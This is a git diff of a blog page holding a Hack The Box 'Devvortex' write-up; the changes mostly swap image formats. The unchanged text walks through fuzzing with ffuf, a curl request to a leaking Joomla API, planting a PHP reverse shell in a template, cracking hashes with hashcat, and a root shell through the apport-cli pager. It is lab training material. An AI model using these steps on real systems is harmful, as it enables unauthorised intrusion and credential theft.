@@ -38,16 +38,16 @@
 <link rel="canonical" href="http://localhost:4000/posts/htb-devvortex-writeup/" />
 <meta property="og:url" content="http://localhost:4000/posts/htb-devvortex-writeup/" />
 <meta property="og:site_name" content="INTROVERTED BYTES" />
-<meta property="og:image" content="http://localhost:4000/assets/img/headers/devvortex.png" />
+<meta property="og:image" content="http://localhost:4000/assets/img/headers/devvortex.webp" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2024-04-27T15:30:00+00:00" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="http://localhost:4000/assets/img/headers/devvortex.png" />
+<meta property="twitter:image" content="http://localhost:4000/assets/img/headers/devvortex.webp" />
 <meta property="twitter:title" content="Hack The Box Devvortex Writeup" />
 <meta name="twitter:site" content="@kasyapgirijan" />
 <meta name="twitter:creator" content="@kasyapgirijan" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Kasyap Girijan","url":"https://github.com/kasyapgirijan/"},"dateModified":"2025-02-03T16:21:30+00:00","datePublished":"2024-04-27T15:30:00+00:00","description":"Summary Devvortex, a beginner-friendly Linux machine, is vulnerable thanks to its Joomla CMS having an information disclosure flaw. This vulnerability exposes configuration data, including login credentials for the Joomla administrator account. By exploiting this access, an attacker can modify the Joomla template to embed malicious PHP code, ultimately gaining complete control over the system through a shell. Further investigation reveals hashed passwords within the database. Cracking these passwords unlocks SSH access to the machine. Finally, by exploiting a privilege escalation vulnerability in the apport-cli tool, the attacker gains full root access.","headline":"Hack The Box Devvortex Writeup","image":{"lqip":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAADIklEQVR4nJWVS24rVRCGvzqPftiOQyLgiuiCQLoSO2ALbIEJA5aGmLEMxncGO2BEcqXEjuPuPo8qBm0njpBIUlK3dAZd/ddXf52Si6++N94Q4sAUhntFFfqVo+mh6YQoC7xrADs8/w1VfXYOb/15Ho3YeH74ccW7byKxg7ubyp9/jAz3hf5MURVAkJNvDRCgvlmAgY/C+iKyWnWEGAlNgOy5/TsCUGvh6w89NSu1KNOY2W0KORkixzQHIkdVMud+UYABsYXYOkKMxCawWAfWFw3LRYMZjEPifqvsNoYThwvgoqKjzS0z5pc8Ja1WXkFAAIXQCM4LPjpCH1h/seT8fEnXrDCD2O+xZsOY9mQqFMM3oGbIox3smS1EBHsVAYMQBXHzOcaWzy8v6NszRM9RE0K7JQRhc6OkYQdixChgj6RnCscOyAGIvMGEhlFqpWsbzpc9XdOhJaKAk45sC677PbvNDsThPHgPzp8W/4SgZn0FgYPKWqDkSpK5bw8PA6kmUrmjmtF5I6eMGUy5ME0Zq3MLZgqnzpsTN3428MsEBMpk+KjUOrHdTlxfT6w/a5EgmMB2X7jfTGzuE/thQmuF5B95iwhykHFkENvwSgEYaVJ86xCX2e92fLo2xqHHh3YWWBIPu5HhYaSWiqhQ0rFuQQ3c4zjOUUrFsP8X4JzDudmtmoTYCzUlyhjRpqH3c11aFMuZkkZQI42g2XDe4ZxDRHCnMzhzwewFAW3b0jaREAJt27Bat7QLR2jmOU+6m/EGpV9GzJYEWTCEQkmVqhVTo5b61P5DIx7S9LKA5vDzEALeeYLr0cmoqmSDLIZZRRVqhTx6ggS6plB9IecCBqMO8OiB+VJetC3CKzwwTYlhGDEzUs6Py0ScYTaLCdHjnFCq4sSTUp4rFWhjg8K8wU4i+leYcLPZIgK//PwTd5t7rq7ecXe3petabm/vuLy4oMrA2XnHx49/cbn+kvfvr/jn5hMfvvuWX3/7nTRNxONlcBLH3SAvrWMzw3tPzpmUMjFGSimICFWV5aIj9BUfBM2O/a5gGOvVGeuzFaXWZ+MHJ3ZA+BcNsqz461PEEQAAAABJRU5ErkJggg==","url":"http://localhost:4000/assets/img/headers/devvortex.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/htb-devvortex-writeup/"},"url":"http://localhost:4000/posts/htb-devvortex-writeup/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Kasyap Girijan","url":"https://github.com/kasyapgirijan/"},"dateModified":"2025-02-03T16:21:30+00:00","datePublished":"2024-04-27T15:30:00+00:00","description":"Summary Devvortex, a beginner-friendly Linux machine, is vulnerable thanks to its Joomla CMS having an information disclosure flaw. This vulnerability exposes configuration data, including login credentials for the Joomla administrator account. By exploiting this access, an attacker can modify the Joomla template to embed malicious PHP code, ultimately gaining complete control over the system through a shell. Further investigation reveals hashed passwords within the database. Cracking these passwords unlocks SSH access to the machine. Finally, by exploiting a privilege escalation vulnerability in the apport-cli tool, the attacker gains full root access.","headline":"Hack The Box Devvortex Writeup","image":{"lqip":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAADIklEQVR4nJWVS24rVRCGvzqPftiOQyLgiuiCQLoSO2ALbIEJA5aGmLEMxncGO2BEcqXEjuPuPo8qBm0njpBIUlK3dAZd/ddXf52Si6++N94Q4sAUhntFFfqVo+mh6YQoC7xrADs8/w1VfXYOb/15Ho3YeH74ccW7byKxg7ubyp9/jAz3hf5MURVAkJNvDRCgvlmAgY/C+iKyWnWEGAlNgOy5/TsCUGvh6w89NSu1KNOY2W0KORkixzQHIkdVMud+UYABsYXYOkKMxCawWAfWFw3LRYMZjEPifqvsNoYThwvgoqKjzS0z5pc8Ja1WXkFAAIXQCM4LPjpCH1h/seT8fEnXrDCD2O+xZsOY9mQqFMM3oGbIox3smS1EBHsVAYMQBXHzOcaWzy8v6NszRM9RE0K7JQRhc6OkYQdixChgj6RnCscOyAGIvMGEhlFqpWsbzpc9XdOhJaKAk45sC677PbvNDsThPHgPzp8W/4SgZn0FgYPKWqDkSpK5bw8PA6kmUrmjmtF5I6eMGUy5ME0Zq3MLZgqnzpsTN3428MsEBMpk+KjUOrHdTlxfT6w/a5EgmMB2X7jfTGzuE/thQmuF5B95iwhykHFkENvwSgEYaVJ86xCX2e92fLo2xqHHh3YWWBIPu5HhYaSWiqhQ0rFuQQ3c4zjOUUrFsP8X4JzDudmtmoTYCzUlyhjRpqH3c11aFMuZkkZQI42g2XDe4ZxDRHCnMzhzwewFAW3b0jaREAJt27Bat7QLR2jmOU+6m/EGpV9GzJYEWTCEQkmVqhVTo5b61P5DIx7S9LKA5vDzEALeeYLr0cmoqmSDLIZZRRVqhTx6ggS6plB9IecCBqMO8OiB+VJetC3CKzwwTYlhGDEzUs6Py0ScYTaLCdHjnFCq4sSTUp4rFWhjg8K8wU4i+leYcLPZIgK//PwTd5t7rq7ecXe3petabm/vuLy4oMrA2XnHx49/cbn+kvfvr/jn5hMfvvuWX3/7nTRNxONlcBLH3SAvrWMzw3tPzpmUMjFGSimICFWV5aIj9BUfBM2O/a5gGOvVGeuzFaXWZ+MHJ3ZA+BcNsqz461PEEQAAAABJRU5ErkJggg==","url":"http://localhost:4000/assets/img/headers/devvortex.webp","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/htb-devvortex-writeup/"},"url":"http://localhost:4000/posts/htb-devvortex-writeup/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1624,7 +1624,7 @@
         
 
         <div class="mt-3 mb-3">
-          <a href="/assets/img/headers/devvortex.png" class="popup img-link preview-img blur"><img data-src="/assets/img/headers/devvortex.png"  alt="Preview Image" width="1200" height="630" data-lqip="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAADIklEQVR4nJWVS24rVRCGvzqPftiOQyLgiuiCQLoSO2ALbIEJA5aGmLEMxncGO2BEcqXEjuPuPo8qBm0njpBIUlK3dAZd/ddXf52Si6++N94Q4sAUhntFFfqVo+mh6YQoC7xrADs8/w1VfXYOb/15Ho3YeH74ccW7byKxg7ubyp9/jAz3hf5MURVAkJNvDRCgvlmAgY/C+iKyWnWEGAlNgOy5/TsCUGvh6w89NSu1KNOY2W0KORkixzQHIkdVMud+UYABsYXYOkKMxCawWAfWFw3LRYMZjEPifqvsNoYThwvgoqKjzS0z5pc8Ja1WXkFAAIXQCM4LPjpCH1h/seT8fEnXrDCD2O+xZsOY9mQqFMM3oGbIox3smS1EBHsVAYMQBXHzOcaWzy8v6NszRM9RE0K7JQRhc6OkYQdixChgj6RnCscOyAGIvMGEhlFqpWsbzpc9XdOhJaKAk45sC677PbvNDsThPHgPzp8W/4SgZn0FgYPKWqDkSpK5bw8PA6kmUrmjmtF5I6eMGUy5ME0Zq3MLZgqnzpsTN3428MsEBMpk+KjUOrHdTlxfT6w/a5EgmMB2X7jfTGzuE/thQmuF5B95iwhykHFkENvwSgEYaVJ86xCX2e92fLo2xqHHh3YWWBIPu5HhYaSWiqhQ0rFuQQ3c4zjOUUrFsP8X4JzDudmtmoTYCzUlyhjRpqH3c11aFMuZkkZQI42g2XDe4ZxDRHCnMzhzwewFAW3b0jaREAJt27Bat7QLR2jmOU+6m/EGpV9GzJYEWTCEQkmVqhVTo5b61P5DIx7S9LKA5vDzEALeeYLr0cmoqmSDLIZZRRVqhTx6ggS6plB9IecCBqMO8OiB+VJetC3CKzwwTYlhGDEzUs6Py0ScYTaLCdHjnFCq4sSTUp4rFWhjg8K8wU4i+leYcLPZIgK//PwTd5t7rq7ecXe3petabm/vuLy4oMrA2XnHx49/cbn+kvfvr/jn5hMfvvuWX3/7nTRNxONlcBLH3SAvrWMzw3tPzpmUMjFGSimICFWV5aIj9BUfBM2O/a5gGOvVGeuzFaXWZ+MHJ3ZA+BcNsqz461PEEQAAAABJRU5ErkJggg=="></a></div>
+          <a href="/assets/img/headers/devvortex.webp" class="popup img-link preview-img blur"><img data-src="/assets/img/headers/devvortex.webp"  alt="Preview Image" width="1200" height="630" data-lqip="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAADIklEQVR4nJWVS24rVRCGvzqPftiOQyLgiuiCQLoSO2ALbIEJA5aGmLEMxncGO2BEcqXEjuPuPo8qBm0njpBIUlK3dAZd/ddXf52Si6++N94Q4sAUhntFFfqVo+mh6YQoC7xrADs8/w1VfXYOb/15Ho3YeH74ccW7byKxg7ubyp9/jAz3hf5MURVAkJNvDRCgvlmAgY/C+iKyWnWEGAlNgOy5/TsCUGvh6w89NSu1KNOY2W0KORkixzQHIkdVMud+UYABsYXYOkKMxCawWAfWFw3LRYMZjEPifqvsNoYThwvgoqKjzS0z5pc8Ja1WXkFAAIXQCM4LPjpCH1h/seT8fEnXrDCD2O+xZsOY9mQqFMM3oGbIox3smS1EBHsVAYMQBXHzOcaWzy8v6NszRM9RE0K7JQRhc6OkYQdixChgj6RnCscOyAGIvMGEhlFqpWsbzpc9XdOhJaKAk45sC677PbvNDsThPHgPzp8W/4SgZn0FgYPKWqDkSpK5bw8PA6kmUrmjmtF5I6eMGUy5ME0Zq3MLZgqnzpsTN3428MsEBMpk+KjUOrHdTlxfT6w/a5EgmMB2X7jfTGzuE/thQmuF5B95iwhykHFkENvwSgEYaVJ86xCX2e92fLo2xqHHh3YWWBIPu5HhYaSWiqhQ0rFuQQ3c4zjOUUrFsP8X4JzDudmtmoTYCzUlyhjRpqH3c11aFMuZkkZQI42g2XDe4ZxDRHCnMzhzwewFAW3b0jaREAJt27Bat7QLR2jmOU+6m/EGpV9GzJYEWTCEQkmVqhVTo5b61P5DIx7S9LKA5vDzEALeeYLr0cmoqmSDLIZZRRVqhTx6ggS6plB9IecCBqMO8OiB+VJetC3CKzwwTYlhGDEzUs6Py0ScYTaLCdHjnFCq4sSTUp4rFWhjg8K8wU4i+leYcLPZIgK//PwTd5t7rq7ecXe3petabm/vuLy4oMrA2XnHx49/cbn+kvfvr/jn5hMfvvuWX3/7nTRNxONlcBLH3SAvrWMzw3tPzpmUMjFGSimICFWV5aIj9BUfBM2O/a5gGOvVGeuzFaXWZ+MHJ3ZA+BcNsqz461PEEQAAAABJRU5ErkJggg=="></a></div>
       
 
       <div class="d-flex justify-content-between">
@@ -1769,7 +1769,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </pre></td><td class="rouge-code"><pre>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> http://devvortex.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.devvortex.htb"</span> <span class="nt">-mc</span> 200
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/img/htb/devvortex/1.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/1.png" alt="img-description" loading="lazy"></a> <em>FUZZING for Subdomains</em></p>
+<p><a href="/assets/img/htb/devvortex/1.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/1.webp" alt="img-description" loading="lazy"></a> <em>FUZZING for Subdomains</em></p>
 
 <p>Found dev.devvoertex.htb and have added it to my /etc/hosts and proceeded to explore the site.</p>
 
@@ -1780,11 +1780,11 @@ Service detection performed. Please report any incorrect results at https://nmap
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> http://dev.devvortex.htb/FUZZ
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/htb/devvortex/2.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/2.png" alt="img-description" loading="lazy"></a> <em>Reveling hidden web content</em></p>
+<p><a href="/assets/img/htb/devvortex/2.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/2.webp" alt="img-description" loading="lazy"></a> <em>Reveling hidden web content</em></p>
 
 <p>I went ahead and pivoted to administrator page and notices its using joomla CMS.</p>
 
-<p><a href="/assets/img/htb/devvortex/3.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/3.png" alt="img-description" loading="lazy"></a> <em>Joomla CMS</em></p>
+<p><a href="/assets/img/htb/devvortex/3.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/3.webp" alt="img-description" loading="lazy"></a> <em>Joomla CMS</em></p>
 
 <h3 id="initial-step"><span class="me-2">Initial Step:</span><a href="#initial-step" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
@@ -1798,17 +1798,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 </pre></td><td class="rouge-code"><pre>curl <span class="nt">-v</span> http://dev.devvortex.htb/api/index.php/v1/config/application?public<span class="o">=</span><span class="nb">true</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/img/htb/devvortex/4.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/4.png" alt="img-description" loading="lazy"></a> <em>exploiting the vulnerablity</em></p>
+<p><a href="/assets/img/htb/devvortex/4.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/4.webp" alt="img-description" loading="lazy"></a> <em>exploiting the vulnerablity</em></p>
 
 <p>Leveraging the vulnerability, I was able to retrieve the credentials for Joomla Administrator.</p>
 
-<p><a href="/assets/img/htb/devvortex/5.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/5.png" alt="img-description" loading="lazy"></a> <em>Admin Access</em></p>
+<p><a href="/assets/img/htb/devvortex/5.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/5.webp" alt="img-description" loading="lazy"></a> <em>Admin Access</em></p>
 
 <p>I know that we can modify PHP templates in such CMS and can gain reverse shell. Lets try !</p>
 
 <p>So, I went ahead to <code class="language-plaintext highlighter-rouge">System -&gt; Templates -&gt; Administrator Templates -&gt; Atum -&gt; login.php</code> and added my payload and saved the template.</p>
 
-<p><a href="/assets/img/htb/devvortex/6.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/6.png" alt="img-description" loading="lazy"></a> <em>PHP reverse shell</em></p>
+<p><a href="/assets/img/htb/devvortex/6.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/6.webp" alt="img-description" loading="lazy"></a> <em>PHP reverse shell</em></p>
 
 <p>Payload used for reverse shell.</p>
 <div class="language-bash highlighter-rouge"><div class="code-header">
@@ -1824,7 +1824,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </pre></td><td class="rouge-code"><pre>nc <span class="nt">-lvnp</span> 4444
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/img/htb/devvortex/7.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/7.png" alt="img-description" loading="lazy"></a> <em>PHP reverse shell</em></p>
+<p><a href="/assets/img/htb/devvortex/7.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/7.webp" alt="img-description" loading="lazy"></a> <em>PHP reverse shell</em></p>
 
 <p>I received the shell but seems like needing to stabalize it.</p>
 
@@ -1865,7 +1865,7 @@ Ctrl-Z
 
 <p>Reviewing the database <code class="language-plaintext highlighter-rouge">joomla</code> I was able to retrive the user credential user logan from table <code class="language-plaintext highlighter-rouge">sd4fg_users</code></p>
 
-<p><a href="/assets/img/htb/devvortex/8.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/8.png" alt="img-description" loading="lazy"></a> <em>Db user table dump</em></p>
+<p><a href="/assets/img/htb/devvortex/8.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/8.webp" alt="img-description" loading="lazy"></a> <em>Db user table dump</em></p>
 
 <p>The password is hashed with ‘bcrypt’ hashing mechanism, so I went ahead and saved hash in a text file and ran <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>
 
@@ -1874,7 +1874,7 @@ Ctrl-Z
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 3200 <span class="nt">-a</span> 0 hash.txt /usr/share/worlist/rockyou.txt
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/htb/devvortex/9.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/9.png" alt="img-description" loading="lazy"></a> <em>hashcat</em></p>
+<p><a href="/assets/img/htb/devvortex/9.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/9.webp" alt="img-description" loading="lazy"></a> <em>hashcat</em></p>
 
 <p>The password was cracked in an instant, so I SSHed into the box with the cracked credentials.</p>
 
@@ -1892,7 +1892,7 @@ Ctrl-Z
 
 <p>With which, I learned  that I (now the user) can run <code class="language-plaintext highlighter-rouge">apport-cli</code>  with root privileges.</p>
 
-<p><a href="/assets/img/htb/devvortex/10.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/10.png" alt="img-description" loading="lazy"></a> <em>approt-cli</em></p>
+<p><a href="/assets/img/htb/devvortex/10.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/10.webp" alt="img-description" loading="lazy"></a> <em>approt-cli</em></p>
 
 <p>I simply googled to get more understanding and found out privilege escalation vulnerability <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">CVE-2023-1326</a> in apport-cli, that could alow me to pivot to root.</p>
 
@@ -2099,7 +2099,7 @@ What would you like to <span class="k">do</span>? Your options are:
 Please choose <span class="o">(</span>S/V/K/I/C<span class="o">)</span>: v
 </pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/assets/img/htb/devvortex/11.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/11.png" alt="img-description" loading="lazy"></a> <em>exploiting the vulnerability</em></p>
+<p><a href="/assets/img/htb/devvortex/11.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/11.webp" alt="img-description" loading="lazy"></a> <em>exploiting the vulnerability</em></p>
 
 <blockquote class="prompt-info">
   <p><code class="language-plaintext highlighter-rouge">Vulnerability</code>: Less is configured as the pager in apport-cli allowing us to set: the terminal size.</p>
@@ -2107,7 +2107,7 @@ Please choose <span class="o">(</span>S/V/K/I/C<span class="o">)</span>: v
 
 <p>Once I hit the enter key after typing the command <code class="language-plaintext highlighter-rouge">!/bin/bash</code> the pager closed leaving a escalated shell to root.</p>
 
-<p><a href="/assets/img/htb/devvortex/12.png" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/12.png" alt="img-description" loading="lazy"></a> <em>whoami - Root!</em></p>
+<p><a href="/assets/img/htb/devvortex/12.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/devvortex/12.webp" alt="img-description" loading="lazy"></a> <em>whoami - Root!</em></p>
 
 <p>We have the machine <code class="language-plaintext highlighter-rouge">ROOTED!</code></p>
 
@@ -2258,6 +2258,13 @@ Please choose <span class="o">(</span>S/V/K/I/C<span class="o">)</span>: v
         
         
         <li class="text-truncate lh-lg">
+          <a href="/posts/exploring_tls_securing_tcp_communication/">Exploring TLS: Securing TCP Communication</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
           <a href="/posts/htb-keeper-writeup/">Hack The Box | Keeper Writeup</a>
         </li>
       
@@ -2280,13 +2287,6 @@ Please choose <span class="o">(</span>S/V/K/I/C<span class="o">)</span>: v
         
         <li class="text-truncate lh-lg">
           <a href="/posts/htb-manager-writeup/">Hack The Box | Manager Writeup</a>
-        </li>
-      
-        
-        
-        
-        <li class="text-truncate lh-lg">
-          <a href="/posts/htb-analytics-writeup/">Hack The Box | Analytics Writeup</a>
         </li>
       
     </ul>
